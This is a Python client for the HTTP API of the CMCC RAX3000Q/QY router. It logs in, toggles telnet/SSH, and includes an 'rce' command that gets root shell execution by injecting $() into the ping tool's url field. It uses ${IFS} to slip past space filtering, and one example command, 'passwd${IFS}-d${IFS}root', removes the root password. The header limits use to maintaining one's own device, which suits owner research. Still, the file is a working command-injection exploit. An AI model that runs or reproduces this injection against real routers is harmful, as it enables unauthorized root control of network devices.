#!/usr/bin/env python3
"""
Minimal client for CMCC RAX3000Q/QY /cgi-bin/http.cgi.

Credentials are read from environment variables:
    ROUTER_IP    default 192.168.123.1
    ROUTER_USER  default admin
    ROUTER_PASS  required for login

Examples:
    ROUTER_PASS='...' ./router_api.py login
    ROUTER_PASS='...' ./router_api.py init
    ROUTER_PASS='...' ./router_api.py telnet-on
    ROUTER_PASS='...' ./router_api.py telnet-off
    ROUTER_PASS='...' ./router_api.py rce 'id'
    ROUTER_PASS='...' ./router_api.py rce 'passwd${IFS}-d${IFS}root'

This tool is for authorized maintenance of your own device only.
"""

import argparse
import hashlib
import json
import os
import sys
import time
import urllib.request

DEFAULT_IP = "192.168.123.1"
DEFAULT_USER = "admin"
HTTP_TIMEOUT = 15

# Command IDs used by this firmware.
CMD_INIT_PAGE = 80
CMD_LOGIN = 100
CMD_NETWORK_TOOLS = 168
CMD_GET_FILE_DATA = 204
CMD_GET_NEXT_LOGIN_TIME = 232
CMD_SYS_SERVICE_SET = 234


class RouterError(RuntimeError):
    pass


class Router:
    def __init__(self, host=None, user=None, password=None):
        self.host = host or os.environ.get("ROUTER_IP", DEFAULT_IP)
        self.user = user or os.environ.get("ROUTER_USER", DEFAULT_USER)
        self.password = password or os.environ.get("ROUTER_PASS")
        if not self.password:
            raise RouterError("ROUTER_PASS is not set")
        self.base = f"http://{self.host}/cgi-bin/http.cgi"
        self.session = ""

    def post(self, payload):
        payload.setdefault("method", "GET")
        payload.setdefault("sessionId", self.session)
        data = json.dumps(payload).encode()
        req = urllib.request.Request(
            self.base,
            data=data,
            headers={
                "Content-Type": "application/json;charset=UTF-8",
                "Accept": "application/json, text/plain, */*",
                "Referer": f"http://{self.host}/",
                "User-Agent": "Mozilla/5.0 (compatible; rax3000q-archive/1.0)",
            },
        )
        with urllib.request.urlopen(req, timeout=HTTP_TIMEOUT) as resp:
            raw = resp.read().decode("utf-8", errors="ignore")
        try:
            return json.loads(raw)
        except json.JSONDecodeError:
            return raw

    def login(self):
        challenge = self.post(
            {"cmd": CMD_GET_NEXT_LOGIN_TIME, "method": "GET", "sessionId": ""}
        )
        if not isinstance(challenge, dict) or "token" not in challenge:
            raise RouterError(f"unexpected challenge response: {challenge!r}")
        if challenge.get("buffer") == "0":
            raise RouterError(
                "login is locked; wait for netx_login_time seconds "
                f"({challenge.get('netx_login_time')})"
            )
        token = challenge["token"]
        passwd = hashlib.sha256((token + self.password).encode()).hexdigest()
        result = self.post(
            {
                "cmd": CMD_LOGIN,
                "method": "POST",
                "username": self.user,
                "passwd": passwd,
                "isAutoUpgrade": "0",
                "sessionId": "",
            }
        )
        if not isinstance(result, dict) or not result.get("sessionId"):
            raise RouterError(f"login failed: {result!r}")
        self.session = result["sessionId"]
        return result

    def init_page(self):
        return self.post(
            {"cmd": CMD_INIT_PAGE, "method": "GET", "sessionId": self.session}
        )

    def sys_service_set(self, telnet=None, ssh=None):
        payload = {"cmd": CMD_SYS_SERVICE_SET, "method": "POST"}
        if telnet is not None:
            payload["telnet"] = "1" if telnet else "0"
        if ssh is not None:
            payload["ssh"] = "1" if ssh else "0"
        return self.post(payload)

    def ping(self, target, times=1):
        return self.post(
            {
                "cmd": CMD_NETWORK_TOOLS,
                "method": "POST",
                "subcmd": 0,
                "pingTimes": times,
                "url": target,
            }
        )

    def read_ping_output(self):
        return self.post(
            {
                "cmd": CMD_GET_FILE_DATA,
                "method": "GET",
                "url": "/tmp/tzwww/pingrt",
                "subcmd": CMD_NETWORK_TOOLS,
            }
        )

    def rce(self, command):
        """Execute command as root via the ping url injection.

        Use ${IFS} instead of spaces, e.g. 'passwd${IFS}-d${IFS}root'.
        """
        self.ping(f"$({command})")
        time.sleep(1)
        return self.read_ping_output()


def main():
    parser = argparse.ArgumentParser(description="RAX3000Q HTTP API helper")
    parser.add_argument("--ip", default=os.environ.get("ROUTER_IP", DEFAULT_IP))
    parser.add_argument("--user", default=os.environ.get("ROUTER_USER", DEFAULT_USER))
    sub = parser.add_subparsers(dest="action", required=True)

    sub.add_parser("login", help="login and print user_level/session")
    sub.add_parser("init", help="login and print INIT_PAGE account_level")
    sub.add_parser("telnet-on", help="enable telnet (port 4719)")
    sub.add_parser("telnet-off", help="disable telnet")

    p_rce = sub.add_parser("rce", help="run a root command via ping injection")
    p_rce.add_argument("command", help="shell command; use ${IFS} for spaces")

    p_ping = sub.add_parser("ping", help="send a ping target and print output")
    p_ping.add_argument("target")

    args = parser.parse_args()
    router = Router(host=args.ip, user=args.user)

    if args.action == "login":
        result = router.login()
        print(json.dumps(result, ensure_ascii=False, indent=2))
        return

    router.login()

    if args.action == "init":
        data = router.init_page()
        print(json.dumps(data, ensure_ascii=False, indent=2))
    elif args.action == "telnet-on":
        print(json.dumps(router.sys_service_set(telnet=True, ssh=True), ensure_ascii=False))
    elif args.action == "telnet-off":
        print(json.dumps(router.sys_service_set(telnet=False, ssh=True), ensure_ascii=False))
    elif args.action == "rce":
        print(router.rce(args.command))
    elif args.action == "ping":
        print(json.dumps(router.ping(args.target), ensure_ascii=False))
        time.sleep(1)
        print(router.read_ping_output())


if __name__ == "__main__":
    try:
        main()
    except RouterError as exc:
        print(f"error: {exc}", file=sys.stderr)
        sys.exit(1)
